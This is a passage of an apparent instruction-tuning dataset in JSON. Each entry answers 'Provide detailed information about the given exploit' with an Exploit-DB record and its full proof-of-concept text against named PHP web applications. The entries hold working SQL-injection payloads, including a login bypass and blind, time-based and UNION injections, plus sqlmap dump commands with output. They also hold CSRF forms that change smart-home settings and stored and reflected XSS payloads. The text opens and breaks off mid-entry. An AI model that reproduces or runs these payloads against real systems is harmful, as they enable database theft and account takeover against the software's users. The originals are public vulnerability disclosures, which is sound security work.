SOLUTION\n-------------------------\nImplement in each call the validation of the token variable, as already\ndone in other phpMyAdmin requests.\n\nVIII. REFERENCES\n-------------------------\nhttps://www.phpmyadmin.net/\n\nIX. CREDITS\n-------------------------\nThis vulnerability has been discovered and reported\nby Manuel Garcia Cardenas (advidsec (at) gmail (dot) com).\n\nX. REVISION HISTORY\n-------------------------\nJune 13, 2019 1: Initial release\nSeptember 13, 2019 2: Last revision\n\nXI. DISCLOSURE TIMELINE\n-------------------------\nJune 13, 2019 1: Vulnerability acquired by Manuel Garcia Cardenas\nJune 13, 2019 2: Send to vendor\nJuly 16, 2019 3: New request to vendor without fix date\nSeptember 13, 2019 4: Sent to lists\n\nXII. LEGAL NOTICES\n-------------------------\nThe information contained within this advisory is supplied \"as-is\" with no\nwarranties or guarantees of fitness of use or otherwise.\n\nXIII. ABOUT\n-------------------------\nManuel Garcia Cardenas\nPentester"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47758",
        "output": {
            "ID": "47758",
            "File": "exploits/php/webapps/47758.txt",
            "Description": "PRO-7070 Haz\u0131r Profesyonel Web Sitesi 1.0 - Authentication Bypass",
            "Date Published": "2019-12-09",
            "Author": "Ahmet \u00dcmit BAYRAM",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2019-12-09",
            "Date Updated": "2019-12-09",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Authentication Bypass / Credentials Bypass (AB/CB)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: PRO-7070 Haz\u0131r Profesyonel Web Sitesi 1.0 - Authentication Bypass\n# Date: 2019-12-08\n# Exploit Author: Ahmet \u00dcmit BAYRAM\n# Vendor Homepage: https://www.websitem.biz/hazir-site/pro-7070-hazir-mobil-tablet-uyumlu-web-sitesi\n# Tested on: Kali Linux\n# Version: 1.0\n# CVE: N/A\n\n----- PoC: Authentication Bypass -----\n\nAdministration Panel: http://localhost/[PATH]/yonetim/pass.asp\nUsername: '=' 'or'\nPassword: '=' 'or'"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47205",
        "output": {
            "ID": "47205",
            "File": "exploits/php/webapps/47205.txt",
            "Description": "Rest - Cafe and Restaurant Website CMS - 'slug' SQL Injection",
            "Date Published": "2019-08-02",
            "Author": "n1x_",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-08-02",
            "Date Updated": "2019-08-02",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Rest - Cafe and Restaurant Website CMS - SQL Injection\n# Date: 1.8.2019.\n# Exploit Author: n1x_ [MS-WEB]\n# Vendor Homepage: https://codecanyon.net/item/rest-cafe-and-restaurant-website-cms/21630154\n# CWE : CWE-89\n\nVulnerable parameter: slug (news.php)\n\n[GET Request]\n\nGET //host/[path]/news.php?slug=x' HTTP/1.1\nAccept: text/html, application/xhtml+xml, application/xml; q=0.9, */*; q=0.8\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US\nCache-Control: max-age=0\nCookie: PHPSESSID=87e839a144a7c326454406dea88b92bc\nHost: host\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47585",
        "output": {
            "ID": "47585",
            "File": "exploits/php/webapps/47585.txt",
            "Description": "rimbalinux AhadPOS 1.11 - 'alamatCustomer' SQL Injection",
            "Date Published": "2019-11-05",
            "Author": "cakes",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-11-05",
            "Date Updated": "2019-11-05",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comAhadPOS-master.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: rimbalinux AhadPOS 1.11 - 'alamatCustomer' SQL Injection\n# Date: 2019-11-01\n# Exploit Author: Cakes\n# Vendor Homepage: https://github.com/rimbalinux/AhadPOS\n# Software Link: https://github.com/rimbalinux/AhadPOS.git\n# Version: 1.11\n# Tested on: CentOS 7\n# CVE: N/A\n\n# PoC for time-based and boolean based blind SQL injection\n\n# Parameter: alamatCustomer (POST)\n# Type: time-based blind\n# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n# Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])    \n    \nPayload: namaCustomer=test&alamatCustomer=test'||(SELECT 0x4b686f74 FROM DUAL WHERE 8368=8368 AND (SELECT 9520 FROM (SELECT(SLEEP(5)))gtad))||'&telpCustomer=12312345&keterangan=tester\n\n# Parameter: barcode (POST)\n# Type: boolean-based blind\n# Title: OR boolean-based blind - WHERE or HAVING clause\n# Vector: OR [INFERENCE]    \n    \nPayload: barcode=-3529' OR 4127=4127-- HRDC&jumBarang=1&btnTambah=(t) Tambah\n    \n# Type: time-based blind\n# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n# Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])    \n    \nPayload: barcode=123' AND (SELECT 1256 FROM (SELECT(SLEEP(5)))Nhnk)-- zXsC&jumBarang=1&btnTambah=(t) Tambah"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47730",
        "output": {
            "ID": "47730",
            "File": "exploits/php/webapps/47730.txt",
            "Description": "SmartHouse Webapp 6.5.33 - Cross-Site Request Forgery",
            "Date Published": "2019-12-02",
            "Author": "LiquidWorm",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2019-12-02",
            "Date Updated": "2019-12-03",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Request Forgery (CSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: SmartHouse Webapp 6.5.33 - Cross-Site Request Forgery\n# Discovery by: LiquidWorm\n# Date: 2019-12-02\n# Vendor Homepage: \n# Tested Version: 6.5.33.17072501\n# CVE: N/A\n# Advisory ID: ZSL-2019-5543\n# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5543.php\n\nCarlo Gavazzi SmartHouse Webapp 6.5.33 CSRF/XSS Vulnerabilities\n\n\nVendor: Carlo Gavazzi Automation S.p.A\nProduct web page: http://www.gavazzi-automation.com | http://www.smarthouse.nu\nAffected version: Web-app: 6.5.33.17072501\n                  Web-app: 6.5.32.17062101\n                  Web-app: 6.2.3.16102701\n                  Web-app: 5.5.3.160421101\n                  Web-app: 5.3.3.15120101\n                  Release: 1.0.5.1\n                  Release: 1.0.5.0\n                  Release: 1.0.3.5\n                  Release: 1.0.3.2\n\nSummary: Carlo Gavazzi is an international company that develops, manufactures\nand sells electrical automation components. Our products are used in industrial\nautomation and real estate automation. Smart-house is based on a system that we\nhave developed and produced since 1986, mainly for industrial-related installations.\nOur system is present in more than 150,000 installations. For a few years now, we\nhave focused our development on smart electrical installations for home and property\nautomation. Smart-house is currently installed in both villas and commercial properties.\n\nDesc: The application suffers from multiple CSRF and XSS vulnerabilities. The application\nallows users to perform certain actions via HTTP requests without performing any validity\nchecks to verify the requests. This can be exploited to perform certain actions with\nadministrative privileges if a logged-in user visits a malicious web site. Input passed\nto several GET/POST parameters is not properly sanitised before being returned to the user.\nThis can be exploited to execute arbitrary HTML and script code in a user's browser session\nin context of an affected site.\n\nTested on: Apache\n           PHP\n\n\nVulnerability discovered by Gjoko 'LiquidWorm' Krstic\n                            @zeroscience\n\n\nAdvisory ID: ZSL-2019-5543\nAdvisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5543.php\n\n\n01.11.2019\n\n--\n\n\nReflected XSS (GET):\n--------------------\n\n1. http://192.168.0.24/app/index.php?error=Waddup\"><script>confirm(document.cookie)</script> (pre-auth)\n2. http://192.168.0.24/app/messagepage.php?msg=<script>confirm(document.cookie)</script> (pre-auth)\n3. http://192.168.0.24/app/detaf.php?p=0&l=50\"><script>confirm(document.cookie)</script>&f=5658 (post-auth)\n4. http://192.168.0.24/app/detaf.php?p=0\"><script>confirm(document.cookie)</script>&l=50&f=5658 (post-auth)\n5. http://192.168.0.24/?functionsh=list&part[]=fn__intrudermain001&part[]=fn__intrudersec002&name=IntruderMainFunction\"><script>confirm(document.cookie)</script>&grpl=1 (post-auth)\n\n\nCSRF set temperature:\n---------------------\n\n<html>\n  <body>\n    <form action=\"http://192.168.0.24/app/datasend.php\" method=\"POST\">\n      <input type=\"hidden\" name=\"IDFunction\" value=\"3875\" />\n      <input type=\"hidden\" name=\"favorite\" value=\"0\" />\n      <input type=\"hidden\" name=\"rooms\" value=\"-1\" />\n      <input type=\"hidden\" name=\"userId\" value=\"-300\" />\n      <input type=\"hidden\" name=\"heat_ensave_set\" value=\"24\" />\n      <input type=\"hidden\" name=\"heat_set\" value=\"25.5\" />\n      <input type=\"submit\" value=\"Set\" />\n    </form>\n  </body>\n</html>\n\n\nStored XSS (POST):\n------------------\n\n<html>\n  <body>\n    <form action=\"http://192.168.0.24/app/command.php\" method=\"POST\">\n      <input type=\"hidden\" name=\"op\" value=\"11\" />\n      <input type=\"hidden\" name=\"name\" value='Graph name\"><script>confirm(document.cookie)</script>' />\n      <input type=\"hidden\" name=\"period\" value=\"2\" />\n      <input type=\"hidden\" name=\"gg\" value=\"6\" />\n      <input type=\"hidden\" name=\"ggf\" value=\"6\" />\n      <input type=\"hidden\" name=\"mm\" value=\"11\" />\n      <input type=\"hidden\" name=\"mmf\" value=\"11\" />\n      <input type=\"hidden\" name=\"aa\" value=\"2019\" />\n      <input type=\"hidden\" name=\"aaf\" value=\"2019\" />\n      <input type=\"hidden\" name=\"param\" value=\"[1]\" />\n      <input type=\"submit\" value=\"Send\" />\n    </form>\n  </body>\n</html>\n\n\nReflected XSS (POST):\n---------------------\n\n<html>\n  <body>\n    <form action=\"http://192.168.0.24/refresh.php\">\n      <input type=\"hidden\" name=\"param[0][]\" value=\"switch0251<script>confirm(document.cookie)</script>\" />\n      <input type=\"hidden\" name=\"param[0][]\" value=\"0251\" />\n      <input type=\"hidden\" name=\"param[0][]\" value=\"switch\" />\n      <input type=\"hidden\" name=\"param[1][]\" value=\"switch1250\" />\n      <input type=\"hidden\" name=\"param[1][]\" value=\"1250\" />\n      <input type=\"hidden\" name=\"param[1][]\" value=\"switch\" />\n      <input type=\"submit\" value=\"Send\" />\n    </form>\n  </body>\n</html>"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47756",
        "output": {
            "ID": "47756",
            "File": "exploits/php/webapps/47756.txt",
            "Description": "Snipe-IT Open Source Asset Management 4.7.5 - Persistent Cross-Site Scripting",
            "Date Published": "2019-12-09",
            "Author": "Metin Yunus Kandemir",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2019-12-09",
            "Date Updated": "2019-12-09",
            "Verified": "1",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comsnipe-it-4.7.5.tar.gz",
            "Source URL": "",
            "Exploit": "# Exploit Title: Snipe-IT Open Source Asset Management 4.7.5 - Persistent Cross-Site Scripting\n# Exploit Author: Metin Yunus Kandemir (kandemir)\n# Vendor Homepage: https://snipeitapp.com/\n# Software Link: https://github.com/snipe/snipe-it/releases/tag/v4.7.5\n# Version: 4.7.5\n# Category: Webapps\n# Tested on: Xampp for Windows\n\n# Description:\n# Snipe-IT v4.7.5 has persistent cross-site scripting vulnerability via uploading svg file in accessories section.\n# A malicious authorized user could potentially upload an SVG with a javascript payload.\n\n#Steps to Reproduce:\n\nUpload crafted SVG file when sent request to create accessory.\nClick created accessory and copy uploaded file location.\nBrowse uploaded SVG file location on browser.\nThe alert box will be opened.\n\n#(PoC) Post Request:\n\nPOST /accessories HTTP/1.1\nHost: target\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://target/accessories/create\nContent-Type: multipart/form-data; boundary=---------------------------6547029722068941066578895105\nContent-Length: 1761\nCookie: XSRF-TOKEN=eyJpdiI6Ikh1TURMRnpyVDJsaVh4WUI5MWtQWnc9PSIsInZhbHVlIjoiUUNOcVErbFpcL0hGbmVveU9wYzZlOWRrVXNBbWxqeDBQZ3drbW4yZ2RXWU1POGlQQnVOeG5EcThxaUUraGdSYmlCMmNIc2VMMERxYnJOWDRBRUhmdEx3PT0iLCJtYWMiOiI2ZTg5YTA2MmUxZWRmM2RjYTNmNzI4YTE0YTQyOTQ4MGEzMDYyYWJiMDk5NGYwOWE4M2Y4ZTc4MWMxYzJhOGY1In0%3D; snipeitv4_session=KvsAzbhBKlUwbijPmLc86vCgO0PhG67J6EIIR0MD; laravel_token=eyJpdiI6InRTXC83Qmx0aDdVTE9EbVJzSnJ4V01nPT0iLCJ2YWx1ZSI6InVITklNQ3h3WldXMFIzY01Ob0Zqb1wvdm1NQTZXN3JuXC9Nc0g5Z0lpWXZCaTdiVHFOUVB4ZkpmQWRrVk1ZWVZFN1dZVnRrM3pRdjRCcWxySDRtd3hEWlIxd0h5QThUMDAyaVJcL0YzTmhFMlVlNzVFSG95S2VVYVBiRzNzNUtIOTkwdlBWUmQ1K3dTZHNNeXZJWVNmaWczb2hyOGFWRmI1a1NiNk84a1wvOW1tWXpleTMzSnRwYlowenBHSzN4dHRzd2lUTXd1b1dLNkluMEt2bWE0M1J4UTBaNGMzTGFQWEVOWnNyQk1aQk1nQ0tBejVjUU9XRnc5Q0l0citqSnJlbzgwTEVWQlN5ekdZa2hYckQ5T1ZKc2E2UT09IiwibWFjIjoiZDZhNWE2NjFmOTMwOWI0N2E2NjE3YTQwNWFlYjg0MmMyYTkwYzE1YTc4ZWI3N2U1ZWFjNGIyMzM4ZWU2NjczMyJ9\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n.\n..\nsnip\n..\n.\n\nContent-Disposition: form-data; name=\"image\"; filename=\"test.svg\"\nContent-Type: image/svg+xml\n\n<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"><svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n<polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/>\n<script type=\"text/javascript\">\nalert(1);\n</script>\n</svg>\n\n-----------------------------6547029722068941066578895105--"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47310",
        "output": {
            "ID": "47310",
            "File": "exploits/php/webapps/47310.txt",
            "Description": "SQLiteManager 1.2.0 / 1.2.4 - Blind SQL Injection",
            "Date Published": "2019-08-28",
            "Author": "Rafael Pedrero",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-08-28",
            "Date Updated": "2019-08-28",
            "Verified": "0",
            "Codes": [
                "CVE-2019-9083"
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comSQLiteManager-1.2.0.tar.gz",
            "Source URL": "",
            "Exploit": "<!--\n# Exploit Title: Blind SQL injection in SQLiteManager 1.2.0 (and 1.2.4)\n# Date: 17-02-2019\n# Exploit Author: Rafael Pedrero\n# Vendor Homepage: http://www.sqlitemanager.org/\n# Software Link: http://www.sqlitemanager.org/\n# Version: SQLiteManager 1.2.0 (and 1.2.4)\n# Tested on: All\n# CVE : CVE-2019-9083\n# Category: webapps\n\n\n1. Description\n\nSQLiteManager 1.20 allows SQL injection via the /sqlitemanager/main.php\ndbsel parameter. NOTE: This product is discontinued.\n\n\n2. Proof of Concept\n\nDetect:\nhttp://localhost/sqlitemanager/main.php?dbsel=-1%20or%2072%20=%2072\nhttp://localhost/sqlitemanager/main.php?dbsel=-1%20or%2072%20=%2070\n\nSave the next post in a file: sqli.txt\n\nPOST /sqlite/main.php?dbsel=-1%20or%2032%20%3d%2030 HTTP/1.1\nContent-Length: 191\nContent-Type: application/x-www-form-urlencoded\nX-Requested-With: XMLHttpRequest\nCookie: PHPSESSID=s5uogfet0s4nhr81ihgmg5l4v3;\nSQLiteManager_currentTheme=default; SQLiteManager_currentLangue=8;\nSQLiteManager_fullText=0; SQLiteManager_HTMLon=0\nHost: localhost\nConnection: Keep-alive\nAccept-Encoding: gzip,deflate\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64;\nTrident/5.0)\n\naction=save&ColumnList=1&ConditionList=1&trigger=&TriggerAction=FOR%20EACH%20ROW&TriggerCondition=WHEN&TriggerEvent=DELETE&TriggerMoment=BEFORE&TriggerName=kqluvanc&TriggerOn=t1&TriggerStep=1\n\n$ python sqlmap.py -r sqli.txt -p dbsel --level 5 --risk 3 --dump-all\n\n[11:58:27] [INFO] resuming back-end DBMS 'sqlite'\n[11:58:27] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: dbsel (GET)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause\n    Payload: dbsel=-4019 OR 7689=7689\n---\n[11:58:27] [INFO] the back-end DBMS is SQLite\nweb server operating system: Windows\nweb application technology: PHP X.X.X, Apache 2.X.X\nback-end DBMS: SQLite\n[11:58:27] [INFO] sqlmap will dump entries of all tables from all databases\nnow\n[11:58:27] [INFO] fetching tables for database: 'SQLite_masterdb'\n[11:58:27] [INFO] fetching number of tables for database 'SQLite_masterdb'\n[11:58:27] [WARNING] reflective value(s) found and filtering out\n[11:58:27] [WARNING] running in a single-thread mode. Please consider usage\nof o\nption '--threads' for faster data retrieval\n[11:58:27] [INFO] retrieved: 5\n[11:58:27] [INFO] retrieved: database\n[11:58:28] [INFO] retrieved: user_function\n[11:58:30] [INFO] retrieved: attachment\n[11:58:31] [INFO] retrieved: groupes\n[11:58:32] [INFO] retrieved: users\n.....\n.....\n.....\n\n\n3. Solution:\n\nThe product is discontinued. Update to last version.\n-->"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47569",
        "output": {
            "ID": "47569",
            "File": "exploits/php/webapps/47569.txt",
            "Description": "TheJshen contentManagementSystem 1.04 - 'id' SQL Injection",
            "Date Published": "2019-11-01",
            "Author": "cakes",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2019-11-01",
            "Date Updated": "2019-11-01",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: TheJshen contentManagementSystem 1.04 - 'id' SQL Injection\n# Date: 2019-11-01\n# Exploit Author: Cakes\n# Vendor Homepage: https://github.com/thejshen/contentManagementSystem\n# Version: 1.04\n# Software Link: https://github.com/thejshen/contentManagementSystem.git\n# Tested on: CentOS7\n\n# GET parameter 'id' easy SQL Injection\n---\nParameter: id (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: id=4' AND 5143=5143-- OWXt\n    Vector: AND [INFERENCE]\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=4' AND (SELECT 4841 FROM (SELECT(SLEEP(5)))eqmp)-- ZwTG\n    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 5 columns\n    Payload: id=-4903' UNION ALL SELECT NULL,NULL,CONCAT(0x716a706b71,0x66766f636c546750775053685352676c4f70724d714c4b64494e755252765a626370615a565a4b49,0x717a6a7671),NULL,NULL-- hkoh\n    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47581",
        "output": {
            "ID": "47581",
            "File": "exploits/php/webapps/47581.txt",
            "Description": "thejshen Globitek CMS 1.4 - 'id' SQL Injection",
            "Date Published": "2019-11-05",
            "Author": "cakes",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-11-05",
            "Date Updated": "2019-11-05",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comcontentManagementSystem-master.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: thejshen Globitek CMS 1.4 - 'id' SQL Injection\n# Date: 2019-11-01\n# Exploit Author: Cakes\n# Vendor Homepage: https://github.com/thejshen/contentManagementSystem\n# Software Link: https://github.com/thejshen/contentManagementSystem.git\n# Version: 1.4\n# Tested on: CentOS 7\n# CVE: N/A\n\n# The GET request for content ID is vulnerable to Union, Bolean and Time-Based Blind SQL injection\n\n# Parameter: id (GET)\n# Type: boolean-based blind\n# Title: AND boolean-based blind - WHERE or HAVING clause\n# Vector: AND [INFERENCE]\n\nPayload: id=4' AND 5143=5143-- OWXt\n    \n# Type: time-based blind\n# Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n# Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])\n\nPayload: id=4' AND (SELECT 4841 FROM (SELECT(SLEEP(5)))eqmp)-- ZwTG\n    \n# Type: UNION query\n# Title: Generic UNION query (NULL) - 5 columns\n# Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]    \n    \nPayload: id=-4903' UNION ALL SELECT NULL,NULL,CONCAT(0x716a706b71,0x66766f636c546750775053685352676c4f70724d714c4b64494e755252765a626370615a565a4b49,0x717a6a7671),NULL,NULL-- hkoh"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47583",
        "output": {
            "ID": "47583",
            "File": "exploits/php/webapps/47583.txt",
            "Description": "thrsrossi Millhouse-Project 1.414 - 'content' Persistent Cross-Site Scripting",
            "Date Published": "2019-11-05",
            "Author": "cakes",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-11-05",
            "Date Updated": "2019-11-05",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comMillhouse-Project-master.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: thrsrossi Millhouse-Project 1.414 - 'content' Persistent Cross-Site Scripting\n# Date: 2019-11-01\n# Exploit Author: Cakes\n# Vendor Homepage: https://github.com/thrsrossi/Millhouse-Project\n# Software Link: https://github.com/thrsrossi/Millhouse-Project.git\n# Version: 1.414\n# Tested on: CentOS 7\n# CVE: N/A\n\n# PoC for this XSS attack\n\nPOST /includes/add_comment_sql.php HTTP/1.1\nHost: TARGET\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://TARGET/views/single_post.php?post_id=53\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 59\nCookie: PHPSESSID=0sqr9kui308rq66ol1uu5olb94; submenu1=block; showips=10; showurls=10; showreferers=10\nConnection: close\nUpgrade-Insecure-Requests: 1\nDNT: 1\n\ncontent=%3Cscript%3Ealert%28%22TEST%22%29%3B%3C%2Fscript%3E"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47199",
        "output": {
            "ID": "47199",
            "File": "exploits/php/webapps/47199.txt",
            "Description": "WebIncorp ERP - SQL injection",
            "Date Published": "2019-08-01",
            "Author": "n1x_",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-08-01",
            "Date Updated": "2019-08-02",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: WebIncorp ERP - SQL injection\n# Date: 1.8.2019.\n# Exploit Author: n1x_ [MS-WEB]\n# Vendor Homepage: https://www.webincorp.com/products/erp-software-qatar\n# Version: Every version\n# CWE : CWE-89\n\nVulnerable parameter: prod_id (product_detail.php)\n\n[GET Request]\n\nGET https://host/product_detail.php?prod_id=x' HTTP/1.1\nAccept: text/html, application/xhtml+xml, application/xml; q=0.9, */*; q=0.8\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US\nCache-Control: max-age=0\nCookie: PHPSESSID=t57dv7rdsvut33jroled9v6435\nHost: host\nReferer: https://host/\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47959",
        "output": {
            "ID": "47959",
            "File": "exploits/php/webapps/47959.txt",
            "Description": "Webtareas 2.0 - 'id' SQL Injection",
            "Date Published": "2020-01-24",
            "Author": "Greg.Priest",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2020-01-24",
            "Date Updated": "2020-01-28",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comwebTareas-v2.0.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: Webtareas 2.0 - 'id' SQL Injection\n# Date: 2020-01-23\n# Exploit Author: Greg.Priest\n# Vendor Homepage: http://webtareas.sourceforge.net/general/home.php\n# Software Link: http://webtareas.sourceforge.net/general/home.php\n# Version: Webtareas v2.0\n# Tested on: Windows\n# CVE : N/A\n\nWebtareas v2.0 authenticated Sql injection 0day\n\nVulnerable Request:\n\nPOST /webtareas/includes/general_serv.php HTTP/1.1\nHost: 10.61.57.147\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: */*\nAccept-Language: hu-HU,hu;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 98\nOrigin: http://10.61.57.147\nConnection: close\nReferer: http://10.61.57.147/webtareas/general/home.php?\nCookie: webTareasSID=npmmte1hejtnsi35mcqbc97gse\n\naction=cardview-actions&prefix=..%2F&object=projects&tblnam=projects&extra=&extpath=&id=1[Vulnerable parameter!]&defact=Y\n\n--------------------------------------------------------------------------------------------------------------------------\n\nC:\\Users\\--------\\Desktop\\sqlmap>sqlmap.py -r webt01\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.4.1.17#dev}\n|_ -| . [)]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 12:09:44 /2020-01-23/\n\n[12:09:44] [INFO] parsing HTTP request from 'webt01'\n[12:09:45] [WARNING] provided value for parameter 'extra' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly\n[12:09:45] [WARNING] provided value for parameter 'extpath' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly\n[12:09:45] [INFO] resuming back-end DBMS 'mysql'\n[12:09:45] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: id (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: action=cardview-actions&prefix=../&object=projects&tblnam=projects&extra=&extpath=&id=1' AND 4597=4597 AND 'yvIt'='yvIt&defact=Y\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: action=cardview-actions&prefix=../&object=projects&tblnam=projects&extra=&extpath=&id=1' AND (SELECT 4838 FROM (SELECT(SLEEP(5)))WYXW) AND 